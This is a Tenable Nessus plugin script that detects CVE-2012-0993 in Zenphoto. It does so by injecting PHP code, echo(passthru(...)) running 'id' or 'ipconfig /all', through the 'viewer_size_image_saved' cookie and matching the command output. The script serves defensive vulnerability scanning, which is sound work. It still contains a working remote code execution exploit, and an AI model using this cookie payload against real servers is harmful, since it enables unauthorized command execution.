#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(58456);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/04/14 20:50:07 $");

  script_cve_id("CVE-2012-0993");
  script_bugtraq_id(51916);
  script_osvdb_id(78979, 78980, 78981, 78982);

  script_name(english:"Zenphoto viewer_size_image_saved Cookie Value eval() Call Remote PHP Code Execution");
  script_summary(english:"Tries to run a command");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by a
code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host contains a Zenphoto installation that can be abused to
execute arbitrary PHP code.

In the file 'zp-core/zp-extensions/viewer_size_image.php' the value
of the cookie 'viewer_size_image_saved' is not properly sanitized
before being used in an 'eval()' call. This can allow arbitrary PHP
code to be executed on the server.

Note that exploitation requires the 'viewer_size_image' plugin be
enabled in the application, which is not the case by default.");
  script_set_attribute(attribute:"see_also", value:"https://www.htbridge.ch/advisory/HTB23070");
  script_set_attribute(attribute:"see_also", value:"http://www.zenphoto.org/news/zenphoto-1.4.2.1");
  script_set_attribute(attribute:"solution", value:"Upgrade to Zenphoto 1.4.2.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Zenphoto 1.4.2 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/01/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/02/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/03/23");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:zenphoto:zenphoto");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("zenphoto_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/zenphoto");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
install = get_install_from_kb(appname:'zenphoto', port:port, exit_on_fail:TRUE);

dir = install['dir'];

# Make request for RSS feed to
# obtain an image url
foreach rss_url_style (make_list('/index.php?rss', '/rss.php'))
{
  image_links = make_list();
  url = dir + rss_url_style;

  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : url,
    exit_on_fail : TRUE
  );

  # Extract a link to an image
  items = split(res[2], sep:"<![CDATA[", keep:FALSE);
  foreach item (items)
  {
    rss_link_matches = eregmatch(pattern:"^(http.*)\]\]><\/link.*", string:item);

    if (!isnull(rss_link_matches))
    {
      new_dir = ereg_replace(string:dir , pattern: "\/", replace: "\/");
      mypattern = "^http:\/\/[^\/]+("+new_dir+".*)$";
      matches = eregmatch(pattern:mypattern, string:rss_link_matches[1]);
      if (!isnull(matches))
        image_links = make_list(image_links, matches[1]);
    }
  }
  if (max_index(image_links) > 0) break;
}

if (max_index(image_links) < 1)
  exit(0, "Unable to extract an image URL from the RSS feed for the Zenphoto install at "+build_url(qs:dir, port:port)+".");

# Select the file to read
os = get_kb_item("Host/OS");
if (os)
{
  if ("windows" >< tolower(os))
    cmd = make_list('ipconfig /all');
  else
    cmd = 'id';
  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');
cmd_pats = make_array();
cmd_pats['ipconfig /all'] = "Windows IP Configuration";
cmd_pats['id'] = "uid=[0-9]+\([^)]+\) gid=[0-9]+\([^)]+\)";

vuln_found = FALSE;

foreach cmd (cmds)
{
  command_to_run = 'echo(passthru("'+cmd+'"));';

  foreach image_link_to_request (image_links)
  {
    # Make the code execution request
    res = http_send_recv3(
      port         : port,
      method       : "GET",
      item         : image_link_to_request,
      add_headers  : make_array('Cookie', 'viewer_size_image_saved='+command_to_run+';'),
      exit_on_fail : TRUE
    );

    cmd_pat = cmd_pats[cmd];
    if (
      egrep(pattern:cmd_pat, string: res[2]) &&
      'function switchimage(obj)' >< res[2] &&
      'type="radio" name="viewer_size_image_selection"' >< res[2]
    )
    {
      # Get output snippet
      if ("ipconfig" >< cmd)
        output_starter = "Windows IP Configuration";
      else
        output_starter = "uid=";

      output = strstr(res[2], output_starter) - strstr(res[2], 'function switchimage(obj)');

      # The exploit outputs the executed command output twice
      # We only want one and are choosing the second one with
      # a small bit of context
      output = substr(output, stridx(output, output_starter, 5));

      vuln_found = TRUE;
      break;
    }
  }
  if (vuln_found) break;
}

if (vuln_found)
{
  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to verify the issue exists using the following request ' +
      '\nwhich executed the command "' + cmd  + '" :' +
      '\n' +
      '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) +
      '\n' + http_last_sent_request() +
      '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n';

    if (report_verbosity > 1)
    {
      report +=
        '\n' + 'This produced the following output :' +
        '\n' +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
        '\n' + chomp(output) +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }

    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else exit(0, "The Zenphoto install at " + build_url(qs:dir, port:port) + " is not affected.");
